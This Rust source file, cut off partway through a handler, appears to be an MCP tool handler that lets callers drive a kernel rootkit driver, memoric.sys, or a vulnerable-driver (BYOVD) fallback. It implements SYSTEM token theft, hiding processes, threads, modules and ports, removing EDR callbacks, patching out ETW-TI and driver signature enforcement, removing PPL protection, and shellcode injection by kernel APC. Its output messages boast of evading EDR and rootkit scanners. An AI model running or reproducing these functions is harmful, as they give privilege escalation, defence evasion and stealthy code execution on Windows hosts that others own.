//! MCP kernel tool handler.

use serde_json::{json, Value};
use std::path::PathBuf;

use crate::mcp::action_registry::KernelAction;
use crate::mcp::kernel_meta::{
    annotate_kernel_result, attach_kernel_live_metadata, attach_kernel_preflight,
    is_hybrid_kernel_action, is_memoric_direct_kernel_action, kernel_action_help,
    require_kernel_mutation_preflight,
};
use crate::mcp::readiness::kernel_status;
use crate::mcp::tool_args::{
    invalid_registered_choice_error, normalize_kernel_args, optional_bounded_u64_param,
    parse_address_arg, parse_u64_arg, require_byte_array_param, require_module_name_param,
    require_str_param, require_typed_action, require_u32_param, require_u64_param,
    validate_choice_parameters, validate_common_input_bounds, validate_parameter_bounds,
    validate_parser_hints, validate_required_parameters,
};

const AUTO_KERNEL_DUMP_REGION_ARTIFACT_THRESHOLD: usize = 500;

fn validate_kernel_registry_requirements(args: &Value, action: &str) -> Result<(), String> {
    let mut validation_args = args.clone();
    if let Some(obj) = validation_args.as_object_mut() {
        obj.insert("action".to_string(), Value::String(action.to_string()));
    } else {
        validation_args = json!({ "action": action });
    }
    let normalized_args = normalize_kernel_args(&validation_args);
    validate_required_parameters("kernel", &normalized_args)?;
    validate_choice_parameters("kernel", &normalized_args)?;
    validate_common_input_bounds("kernel", &normalized_args)?;
    validate_parameter_bounds("kernel", &normalized_args)?;
    validate_parser_hints("kernel", &normalized_args)
}

fn normalized_kernel_registry_args(args: &Value, action: &str) -> Result<Value, String> {
    let mut validation_args = args.clone();
    if let Some(obj) = validation_args.as_object_mut() {
        obj.insert("action".to_string(), Value::String(action.to_string()));
    } else {
        validation_args = json!({ "action": action });
    }
    let normalized_args = normalize_kernel_args(&validation_args);
    validate_required_parameters("kernel", &normalized_args)?;
    validate_choice_parameters("kernel", &normalized_args)?;
    validate_common_input_bounds("kernel", &normalized_args)?;
    validate_parameter_bounds("kernel", &normalized_args)?;
    validate_parser_hints("kernel", &normalized_args)?;
    Ok(normalized_args)
}

fn output_path_from_args(args: &Value) -> Option<PathBuf> {
    args.get("output_path")
        .and_then(|value| value.as_str())
        .map(str::trim)
        .filter(|path| !path.is_empty())
        .map(PathBuf::from)
}

fn auto_kernel_output_path(kind: &str, pid: Option<u32>, bytes: &[u8], extension: &str) -> PathBuf {
    let hash = crate::artifact::sha256_bytes(bytes);
    let pid_part = pid
        .map(|pid| pid.to_string())
        .unwrap_or_else(|| "kernel".to_string());
    std::env::temp_dir().join(format!(
        "memoric-{}-{}-{}.{}",
        kind, pid_part, hash, extension
    ))
}

fn write_kernel_artifact_bytes(
    args: &Value,
    kind: &str,
    pid: Option<u32>,
    bytes: &[u8],
    extension: &str,
) -> Result<Value, String> {
    let path = output_path_from_args(args)
        .unwrap_or_else(|| auto_kernel_output_path(kind, pid, bytes, extension));
    let correlation_id = crate::observability::correlation_id_from_args(args);
    crate::artifact::write_artifact_bytes(
        &path,
        bytes,
        crate::artifact::retention_secs_from_args(args),
        correlation_id.as_deref(),
    )
}
/// Try memoric custom driver for kernel ops; fall back to generic BYOVD if not available.
fn memoric_driver_or_byovd(args: &Value, action: &str) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    // If explicit device_path is provided, use BYOVD path
    if args.get("device_path").and_then(|v| v.as_str()).is_some() {
        return match action {
            "token_escalate" => {
                crate::kernel::kernel_token_escalate(args).map_err(|e| e.to_string())
            }
            "dkom_hide" => crate::kernel::dkom_hide_process(args).map_err(|e| e.to_string()),
            "ppl_bypass" => crate::kernel::ppl_bypass(args).map_err(|e| e.to_string()),
            _ => Err(format!("Unknown action: {}", action)),
        };
    }

    // Try memoric custom driver first, auto-installing embedded memoric.sys if needed
    let drv = MemoricDriver::ensure().map_err(|e| {
        format!(
            "{}: failed to ensure memoric.sys automatically: {}. If you want BYOVD fallback, provide device_path/read_ioctl/write_ioctl.",
            action, e
        )
    })?;
    let driver_capabilities = drv.capabilities().ok();
    let driver_offset_profile = driver_capabilities
        .as_ref()
        .map(|caps| caps.offset_profile_json());

    let pid = require_u64_param(args, "pid", "kernel", action)? as u32;

    match action {
        "token_escalate" => {
            // Get EPROCESS info for both system and target
            let sys_info = drv.get_eprocess(4).map_err(|e| e.to_string())?;
            let tgt_info = drv.get_eprocess(pid).map_err(|e| e.to_string())?;
            let target_offset_profile = driver_capabilities
                .as_ref()
                .map(|caps| {
                    tgt_info.offset_profile_json(caps.build_number, caps.offsets_resolved != 0)
                })
                .or_else(|| driver_offset_profile.clone());

            // Steal SYSTEM token → target
            drv.token_steal(4, pid).map_err(|e| e.to_string())?;

            // Read back to verify
            let verify = drv.get_eprocess(pid).map_err(|e| e.to_string())?;

            Ok(serde_json::json!({
                "success": true,
                "technique": "memoric_driver_token_steal",
                "driver": "memoric.sys (custom)",
                "pid": pid,
                "target_eprocess": format!("0x{:016X}", tgt_info.eprocess_address),
                "system_eprocess": format!("0x{:016X}", sys_info.eprocess_address),
                "original_token": format!("0x{:016X}", tgt_info.token),
                "system_token": format!("0x{:016X}", sys_info.token),
                "new_token": format!("0x{:016X}", verify.token),
                "token_replaced": (verify.token & !0xF) == (sys_info.token & !0xF),
                "target_image": tgt_info.image_name(),
                "offset_profile": target_offset_profile,
                "message": format!("PID {} ({}) token replaced with SYSTEM token via memoric.sys — process is now NT AUTHORITY\\SYSTEM!", pid, tgt_info.image_name())
            }))
        }
        "dkom_hide" => {
            let info = drv.get_eprocess(pid).map_err(|e| e.to_string())?;
            let offset_profile = driver_capabilities
                .as_ref()
                .map(|caps| info.offset_profile_json(caps.build_number, caps.offsets_resolved != 0))
                .or_else(|| driver_offset_profile.clone());
            drv.dkom_hide(pid).map_err(|e| e.to_string())?;

            Ok(serde_json::json!({
                "success": true,
                "technique": "memoric_driver_dkom_hide",
                "driver": "memoric.sys (custom)",
                "pid": pid,
                "eprocess": format!("0x{:016X}", info.eprocess_address),
                "image_name": info.image_name(),
                "offset_profile": offset_profile,
                "message": format!("PID {} ({}) unlinked from ActiveProcessLinks — invisible to Task Manager, EnumProcesses, most EDR!", pid, info.image_name())
            }))
        }
        "ppl_bypass" => {
            let info = drv.get_eprocess(pid).map_err(|e| e.to_string())?;
            let offset_profile = driver_capabilities
                .as_ref()
                .map(|caps| info.offset_profile_json(caps.build_number, caps.offsets_resolved != 0))
                .or_else(|| driver_offset_profile.clone());
            drv.ppl_remove(pid).map_err(|e| e.to_string())?;

            Ok(serde_json::json!({
                "success": true,
                "technique": "memoric_driver_ppl_remove",
                "driver": "memoric.sys (custom)",
                "pid": pid,
                "eprocess": format!("0x{:016X}", info.eprocess_address),
                "image_name": info.image_name(),
                "protection_offset": format!("0x{:X}", info.protection_off),
                "offset_profile": offset_profile,
                "message": format!("PID {} ({}) PS_PROTECTION zeroed — PPL removed!", pid, info.image_name())
            }))
        }
        _ => Err(format!("Unknown action: {}", action)),
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// Native memoric.sys IOCTL handlers
// ═════════════════════════════════════════════════════════════════════════════

fn driver_enum_process(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let normalized_args = normalized_kernel_registry_args(args, "driver_enum_process")?;
    let max = optional_bounded_u64_param(
        &normalized_args,
        "max_entries",
        "kernel",
        "driver_enum_process",
        512,
    )? as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv.enum_processes(max).map_err(|e| e.to_string())?;

    let procs: Vec<Value> = entries
        .iter()
        .map(|e| {
            serde_json::json!({
                "pid": e.process_id,
                "ppid": e.parent_process_id,
                "eprocess": format!("0x{:016X}", e.eprocess_address),
                "token": format!("0x{:016X}", e.token),
                "dtb": format!("0x{:016X}", e.directory_table_base),
                "name": e.image_name(),
                "protection": e.protection,
            })
        })
        .collect();

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_enum_process",
        "driver": "memoric.sys",
        "count": procs.len(),
        "processes": procs,
        "message": format!("Enumerated {} processes from kernel ActiveProcessLinks (ground truth, invisible to usermode hooks)", procs.len())
    }))
}

fn driver_module_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let normalized_args = normalized_kernel_registry_args(args, "driver_module_hide")?;
    let name = require_module_name_param(
        &normalized_args,
        "driver_name",
        "kernel",
        "driver_module_hide",
        Some("Example: driver_name='memoric.sys'."),
    )?;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.module_hide(name).map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_module_hide",
        "driver": "memoric.sys",
        "hidden_module": name,
        "message": format!("'{}' unlinked from PsLoadedModuleList — invisible to NtQuerySystemInformation, EnumDeviceDrivers, most rootkit scanners", name)
    }))
}

fn driver_thread_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let normalized_args = normalized_kernel_registry_args(args, "driver_thread_hide")?;
    let tid = require_u32_param(
        &normalized_args,
        "thread_id",
        "kernel",
        "driver_thread_hide",
    )?;
    let pid = require_u32_param(&normalized_args, "pid", "kernel", "driver_thread_hide")?;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.thread_hide(tid, pid).map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_thread_hide",
        "driver": "memoric.sys",
        "thread_id": tid,
        "process_id": pid,
        "message": format!("Thread {} unlinked from PID {} thread list — invisible to thread enumeration", tid, pid)
    }))
}

fn driver_callback_enum(args: &Value) -> Result<Value, String> {
    use crate::driver::{
        MemoricDriver, CALLBACK_TYPE_IMAGE, CALLBACK_TYPE_PROCESS, CALLBACK_TYPE_THREAD,
    };

    let normalized_args = normalized_kernel_registry_args(args, "driver_callback_enum")?;
    let type_str = normalized_args
        .get("callback_type")
        .and_then(|v| v.as_str())
        .unwrap_or("process");
    let max = optional_bounded_u64_param(
        &normalized_args,
        "max_entries",
        "kernel",
        "driver_callback_enum",
        64,
    )? as u32;

    let cb_type = match type_str {
        "process" => CALLBACK_TYPE_PROCESS,
        "thread" => CALLBACK_TYPE_THREAD,
        "image" | "load_image" => CALLBACK_TYPE_IMAGE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_callback_enum",
                "callback_type",
                type_str,
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv.callback_enum(cb_type, max).map_err(|e| e.to_string())?;

    let callbacks: Vec<Value> = entries
        .iter()
        .map(|e| {
            serde_json::json!({
                "address": format!("0x{:016X}", e.callback_address),
                "index": e.index,
                "type": e.callback_type,
                "driver": e.driver_name_str(),
            })
        })
        .collect();

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_callback_enum",
        "driver": "memoric.sys",
        "callback_type": type_str,
        "count": callbacks.len(),
        "callbacks": callbacks,
        "message": format!("Enumerated {} {} callbacks from kernel callback arrays (direct kernel memory scan)", callbacks.len(), type_str)
    }))
}

fn driver_callback_remove(args: &Value) -> Result<Value, String> {
    use crate::driver::{
        MemoricDriver, CALLBACK_TYPE_IMAGE, CALLBACK_TYPE_PROCESS, CALLBACK_TYPE_THREAD,
    };

    let normalized_args = normalized_kernel_registry_args(args, "driver_callback_remove")?;
    let type_str = require_str_param(
        &normalized_args,
        "callback_type",
        "kernel",
        "driver_callback_remove",
        Some("Use one of: process, thread, image."),
    )?;
    let index = require_u32_param(
        &normalized_args,
        "index",
        "kernel",
        "driver_callback_remove",
    )?;
    let addr = parse_address_arg(normalized_args.get("callback_address")).unwrap_or(0);

    let cb_type = match type_str {
        "process" => CALLBACK_TYPE_PROCESS,
        "thread" => CALLBACK_TYPE_THREAD,
        "image" | "load_image" => CALLBACK_TYPE_IMAGE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_callback_remove",
                "callback_type",
                type_str,
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.callback_remove(cb_type, index, addr)
        .map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_callback_remove",
        "driver": "memoric.sys",
        "callback_type": type_str,
        "index": index,
        "callback_address": format!("0x{:016X}", addr),
        "message": format!("Removed {} callback at index {} — EDR/AV callback neutralized via direct kernel memory patching", type_str, index)
    }))
}

fn driver_patch_kernel(args: &Value) -> Result<Value, String> {
    use crate::driver::{MemoricDriver, PATCH_TYPE_DSE, PATCH_TYPE_ETW_TI};

    let normalized_args = normalized_kernel_registry_args(args, "driver_patch_kernel")?;
    let patch_str = require_str_param(
        &normalized_args,
        "patch_type",
        "kernel",
        "driver_patch_kernel",
        Some("Use 'etw_ti' or 'dse'."),
    )?;
    let enable = normalized_args
        .get("enable")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    let patch_type = match patch_str {
        "etw_ti" | "etw" => PATCH_TYPE_ETW_TI,
        "dse" => PATCH_TYPE_DSE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_patch_kernel",
                "patch_type",
                patch_str,
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.patch_kernel(patch_type, enable)
        .map_err(|e| e.to_string())?;

    let action_str = if enable {
        "restored"
    } else {
        "patched (disabled)"
    };

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_patch_kernel",
        "driver": "memoric.sys",
        "patch_type": patch_str,
        "enable": enable,
        "message": format!("{} {} at kernel level via CR0.WP bypass", patch_str.to_uppercase(), action_str)
    }))
}

fn driver_apc_inject(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let normalized_args = normalized_kernel_registry_args(args, "driver_apc_inject")?;
    let pid = require_u32_param(&normalized_args, "pid", "kernel", "driver_apc_inject")?;
    let tid = parse_u64_arg(normalized_args.get("thread_id")).unwrap_or(0) as u32;
    let addr = require_u64_param(
        &normalized_args,
        "shellcode_address",
        "kernel",
        "driver_apc_inject",
    )?;
    let size = require_u32_param(
        &normalized_args,
        "shellcode_size",
        "kernel",
        "driver_apc_inject",
    )?;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.apc_inject(pid, tid, addr, size)
        .map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_apc_inject",
        "driver": "memoric.sys",
        "pid": pid,
        "thread_id": tid,
        "shellcode_address": format!("0x{:016X}", addr),
        "shellcode_size": size,
        "message": format!("Kernel APC queued to PID {} (TID {}) — shellcode at 0x{:016X} will execute on next thread alert check", pid, tid, addr)
    }))
}

fn driver_handle_strip(args: &Value) -> Result<Value, String> {
    use crate::driver::{MemoricDriver, HANDLE_STRIP_PROCESS};

    let normalized_args = normalized_kernel_registry_args(args, "driver_handle_strip")?;
    let strip_type_str = normalized_args
        .get("strip_type")
        .and_then(|v| v.as_str())
        .unwrap_or("process");
    let strip_type = match strip_type_str {
        "process" => HANDLE_STRIP_PROCESS,
        "thread" => 1u32,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_handle_strip",
                "strip_type",
                strip_type_str,
            ))
        }
    };
    let pid = require_u32_param(&normalized_args, "pid", "kernel", "driver_handle_strip")?;
    let access_mask = parse_u64_arg(normalized_args.get("access_mask")).unwrap_or(0) as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let resp = drv
        .handle_strip(pid, strip_type, access_mask)
        .map_err(|e| e.to_string())?;

    Ok(serde_json::json!({
        "success": true,
        "technique": "memoric_driver_handle_strip",
        "driver": "memoric.sys",
        "target_pid": pid,
        "handles_closed": resp.handles_modified,
        "message": format!("Closed {} handles to PID {} from other processes — EDR/AV can no longer query or manipulate this process", resp.handles_modified, pid)
    }))
}

fn driver_reg_protect(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_reg_protect")?;
    let reg_action = normalized_args
        .get("reg_action")
        .and_then(|v| v.as_str())
        .unwrap_or("list");
    let action = match reg_action {
        "add" => REG_PROTECT_ADD,
        "remove" => REG_PROTECT_REMOVE,
        "list" => REG_PROTECT_LIST,
        "clear" => REG_PROTECT_CLEAR,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_reg_protect",
                "reg_action",
                reg_action,
            ))
        }
    };

    let reg_flags = normalized_args
        .get("reg_flags")
        .and_then(|v| v.as_str())
        .unwrap_or("all");
    let flags = match reg_flags {
        "delete" => REG_PROTECT_BLOCK_DELETE,
        "modify" => REG_PROTECT_BLOCK_MODIFY,
        "create" => REG_PROTECT_BLOCK_CREATE,
        "all" => REG_PROTECT_BLOCK_ALL,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_reg_protect",
                "reg_flags",
                reg_flags,
            ))
        }
    };

    let key_path = normalized_args
        .get("key_path")
        .and_then(|v| v.as_str())
        .unwrap_or("");

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv
        .reg_protect(action, flags, key_path)
        .map_err(|e| e.to_string())?;

    if action == REG_PROTECT_LIST {
        let list: Vec<Value> = entries
            .iter()
            .map(|e| {
                json!({
                    "index": e.index,
                    "flags": e.flags,
                    "key_path": e.key_path_str(),
                })
            })
            .collect();
        Ok(json!({
            "success": true,
            "technique": "memoric_driver_reg_protect",
            "driver": "memoric.sys",
            "action": reg_action,
            "protected_keys": list,
            "count": list.len()
        }))
    } else {
        Ok(json!({
            "success": true,
            "technique": "memoric_driver_reg_protect",
            "driver": "memoric.sys",
            "action": reg_action,
            "key_path": key_path,
            "flags": flags,
            "message": format!("Registry protection '{}' completed for: {}", reg_action, key_path)
        }))
    }
}

fn driver_notify_routine(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_notify_routine")?;
    let notify_action = require_str_param(
        &normalized_args,
        "notify_action",
        "kernel",
        "driver_notify_routine",
        Some("Use one of: register, unregister, query."),
    )?;
    match notify_action {
        "register" | "unregister" | "query" => {}
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_notify_routine",
                "notify_action",
                notify_action,
            ))
        }
    }
    let notify_type_str = normalized_args
        .get("notify_type")
        .and_then(|v| v.as_str())
        .unwrap_or("process");
    let notify_type = match notify_type_str {
        "process" => NOTIFY_PROCESS_CREATE,
        "thread" => NOTIFY_THREAD_CREATE,
        "image" => NOTIFY_IMAGE_LOAD,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_notify_routine",
                "notify_type",
                notify_type_str,
            ))
        }
    };
    let max_events = optional_bounded_u64_param(
        &normalized_args,
        "max_events",
        "kernel",
        "driver_notify_routine",
        64,
    )? as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;

    match notify_action {
        "register" => {
            drv.notify_register(notify_type)
                .map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_notify_routine",
                "driver": "memoric.sys",
                "action": "register",
                "notify_type": notify_type_str,
                "message": format!("Registered {} notification callback — events will accumulate in kernel ring buffer", notify_type_str)
            }))
        }
        "unregister" => {
            drv.notify_unregister(notify_type)
                .map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_notify_routine",
                "driver": "memoric.sys",
                "action": "unregister",
                "notify_type": notify_type_str,
                "message": format!("Unregistered {} notification callback", notify_type_str)
            }))
        }
        "query" => {
            let events = drv.notify_query(max_events).map_err(|e| e.to_string())?;
            let event_list: Vec<Value> = events
                .iter()
                .map(|evt| {
                    let type_str = match evt.event_type {
                        0 => "process",
                        1 => "thread",
                        2 => "image",
                        _ => "unknown",
                    };
                    json!({
                        "type": type_str,
                        "pid": evt.process_id,
                        "tid": evt.thread_id,
                        "ppid": evt.parent_process_id,
                        "image_base": format!("0x{:016X}", evt.image_base),
                        "image_size": evt.image_size,
                        "timestamp": evt.timestamp,
                        "create": evt.create != 0,
                        "image_name": evt.image_name_str(),
                    })
                })
                .collect();
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_notify_routine",
                "driver": "memoric.sys",
                "action": "query",
                "event_count": event_list.len(),
                "events": event_list
            }))
        }
        _ => unreachable!("notify_action was validated before driver open"),
    }
}

fn driver_pe_dump(args: &Value) -> Result<Value, String> {
    use crate::driver::MemoricDriver;

    let normalized_args = normalized_kernel_registry_args(args, "driver_pe_dump")?;
    let pid = require_u32_param(&normalized_args, "pid", "kernel", "driver_pe_dump")?;
    let base_address = parse_address_arg(normalized_args.get("base_address")).unwrap_or(0);
    let max_size = parse_u64_arg(normalized_args.get("max_dump_size")).unwrap_or(0) as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let (resp, pe_bytes) = drv
        .pe_dump(pid, base_address, max_size)
        .map_err(|e| e.to_string())?;

    let artifact = write_kernel_artifact_bytes(args, "driver-pe-dump", Some(pid), &pe_bytes, "bin")
        .map_err(|e| format!("Failed to write dump artifact: {}", e))?;

    Ok(json!({
        "success": true,
        "technique": "memoric_driver_pe_dump",
        "driver": "memoric.sys",
        "pid": pid,
        "base_address": format!("0x{:016X}", resp.base_address),
        "image_size": resp.image_size,
        "dumped_bytes": pe_bytes.len(),
        "dump_file": artifact["path"].as_str().unwrap_or_default(),
        "output_path": artifact["path"].as_str().unwrap_or_default(),
        "artifact": artifact,
        "redaction_status": "artifact",
        "export_reason": if output_path_from_args(args).is_some() {
            "explicit_output_path"
        } else {
            "driver_dump_auto"
        },
        "message": format!("Dumped {} bytes of PE image from PID {} (base 0x{:016X}) via kernel MmCopyVirtualMemory", pe_bytes.len(), pid, resp.base_address)
    }))
}

fn driver_set_debug_port(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_set_debug_port")?;
    let pid = require_u32_param(&normalized_args, "pid", "kernel", "driver_set_debug_port")?;
    let debug_action_str = normalized_args
        .get("debug_action")
        .and_then(|v| v.as_str())
        .unwrap_or("hide");
    let action = match debug_action_str {
        "clear_port" => DEBUG_CLEAR_PORT,
        "no_debug" => DEBUG_SET_NO_DEBUG,
        "hide" => DEBUG_HIDE_FROM_DBG,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_set_debug_port",
                "debug_action",
                debug_action_str,
            ))
        }
    };

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    drv.set_debug_port(pid, action).map_err(|e| e.to_string())?;

    let desc = match debug_action_str {
        "clear_port" => "Zeroed EPROCESS.DebugPort — process appears undebugged",
        "no_debug" => "Set NoDebugInherit flag — child processes cannot be debugged",
        "hide" => "Full debug hide: DebugPort zeroed + NoDebugInherit set",
        _ => "Unknown",
    };

    Ok(json!({
        "success": true,
        "technique": "memoric_driver_set_debug_port",
        "driver": "memoric.sys",
        "pid": pid,
        "action": debug_action_str,
        "message": format!("PID {} anti-debug applied: {}", pid, desc)
    }))
}

fn driver_dpc_timer(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let normalized_args = normalized_kernel_registry_args(args, "driver_dpc_timer")?;
    let dpc_action = normalized_args
        .get("dpc_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    match dpc_action {
        "schedule" | "cancel" | "query" => {}
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_dpc_timer",
                "dpc_action",
                dpc_action,
            ))
        }
    }
    let index = parse_u64_arg(normalized_args.get("timer_index")).unwrap_or(0) as u32;

    match dpc_action {
        "schedule" => {
            let delay_ms = parse_u64_arg(normalized_args.get("delay_ms")).unwrap_or(5000);
            let pid = parse_u64_arg(normalized_args.get("pid")).unwrap_or(0) as u32;
            let op_str = normalized_args
                .get("dpc_operation")
                .and_then(|v| v.as_str())
                .unwrap_or("log");
            let operation = match op_str {
                "log" => DPC_OP_LOG,
                "hide_process" => DPC_OP_HIDE_PROCESS,
                "escalate_token" => DPC_OP_ESCALATE_TOKEN,
                _ => {
                    return Err(invalid_registered_choice_error(
                        "kernel",
                        "driver_dpc_timer",
                        "dpc_operation",
                        op_str,
                    ))
                }
            };
            let drv = MemoricDriver::ensure()
                .map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
            drv.dpc_schedule(index, delay_ms, pid, operation)
                .map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_dpc_timer",
                "driver": "memoric.sys",
                "action": "schedule",
                "timer_index": index,
                "delay_ms": delay_ms,
                "target_pid": pid,
                "operation": op_str,
                "message": format!("DPC timer {} scheduled: {}ms delay, operation={} on PID {}", index, delay_ms, op_str, pid)
            }))
        }
        "cancel" => {
            let drv = MemoricDriver::ensure()
                .map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
            drv.dpc_cancel(index).map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_dpc_timer",
                "driver": "memoric.sys",
                "action": "cancel",
                "timer_index": index,
                "message": format!("DPC timer {} cancelled", index)
            }))
        }
        "query" => {
            let drv = MemoricDriver::ensure()
                .map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
            let resp = drv.dpc_query(index).map_err(|e| e.to_string())?;
            Ok(json!({
                "success": true,
                "technique": "memoric_driver_dpc_timer",
                "driver": "memoric.sys",
                "action": "query",
                "timer_index": resp.timer_index,
                "active": resp.active != 0,
                "fire_count": resp.fire_count
            }))
        }
        _ => unreachable!("dpc_action was validated before driver open"),
    }
}

fn driver_port_hide(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let port_action = args
        .get("port_action")
        .and_then(|v| v.as_str())
        .unwrap_or("list");
    let action = match port_action {
        "add" => PORT_HIDE_ADD,
        "remove" => PORT_HIDE_REMOVE,
        "list" => PORT_HIDE_LIST,
        "clear" => PORT_HIDE_CLEAR,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_port_hide",
                "port_action",
                port_action,
            ))
        }
    };
    let port = optional_bounded_u64_param(args, "port", "kernel", "driver_port_hide", 0)? as u16;
    let protocol_str = args
        .get("protocol")
        .and_then(|v| v.as_str())
        .unwrap_or("tcp");
    let protocol = match protocol_str {
        "tcp" => PORT_PROTOCOL_TCP,
        "udp" => PORT_PROTOCOL_UDP,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_port_hide",
                "protocol",
                protocol_str,
            ))
        }
    };

    let normalized_args = normalized_kernel_registry_args(args, "driver_port_hide")?;
    let args = &normalized_args;
    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let entries = drv
        .port_hide(action, port, protocol)
        .map_err(|e| e.to_string())?;

    if action == PORT_HIDE_LIST {
        let list: Vec<Value> = entries
            .iter()
            .map(|e| {
                json!({
                    "port": e.port,
                    "protocol": if e.protocol == 0 { "tcp" } else { "udp" },
                })
            })
            .collect();
        Ok(json!({
            "success": true,
            "technique": "memoric_driver_port_hide",
            "driver": "memoric.sys",
            "action": port_action,
            "hidden_ports": list,
            "count": list.len()
        }))
    } else {
        Ok(json!({
            "success": true,
            "technique": "memoric_driver_port_hide",
            "driver": "memoric.sys",
            "action": port_action,
            "port": port,
            "protocol": if protocol == 0 { "tcp" } else { "udp" },
            "message": format!("Port hide '{}': {} port {}", port_action, if protocol == 0 { "TCP" } else { "UDP" }, port)
        }))
    }
}

fn driver_token_dup(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let token_action = args
        .get("token_action")
        .and_then(|v| v.as_str())
        .unwrap_or("system");
    let action = match token_action {
        "copy" => TOKEN_DUP_COPY,
        "system" => TOKEN_DUP_SYSTEM,
        "restore" => TOKEN_DUP_RESTORE,
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_token_dup",
                "token_action",
                token_action,
            ))
        }
    };

    let normalized_args = normalized_kernel_registry_args(args, "driver_token_dup")?;
    let args = &normalized_args;
    let pid = require_u64_param(args, "pid", "kernel", "driver_token_dup")? as u32;
    let source_pid = parse_u64_arg(args.get("source_pid")).unwrap_or(0) as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    let resp = drv
        .token_dup(pid, source_pid, action)
        .map_err(|e| e.to_string())?;

    Ok(json!({
        "success": true,
        "technique": "memoric_driver_token_dup",
        "driver": "memoric.sys",
        "target_pid": resp.target_pid,
        "source_pid": resp.source_pid,
        "original_token": format!("0x{:016X}", resp.original_token),
        "new_token": format!("0x{:016X}", resp.new_token),
        "action": token_action,
        "message": format!("Token duplicated: PID {} now has token from PID {} (0x{:016X} -> 0x{:016X})",
            resp.target_pid, resp.source_pid, resp.original_token, resp.new_token)
    }))
}

fn driver_object_hook(args: &Value) -> Result<Value, String> {
    use crate::driver::*;

    let obj_action = args
        .get("obj_action")
        .and_then(|v| v.as_str())
        .unwrap_or("query");
    match obj_action {
        "register" | "unregister" | "query" => {}
        _ => {
            return Err(invalid_registered_choice_error(
                "kernel",
                "driver_object_hook",
                "obj_action",
                obj_action,
            ))
        }
    }

    let normalized_args = normalized_kernel_registry_args(args, "driver_object_hook")?;
    let args = &normalized_args;
    let protect_pid = if obj_action == "register" {
        Some(require_u64_param(args, "protect_pid", "kernel", "driver_object_hook")? as u32)
    } else {
        None
    };
    let strip_access = parse_u64_arg(args.get("strip_access")).unwrap_or(0x1FFFFF) as u32;

    let drv =
        MemoricDriver::ensure().map_err(|e| format!("failed to ensure memoric.sys: {}", e))?;
    match obj_action {
        "register" => {
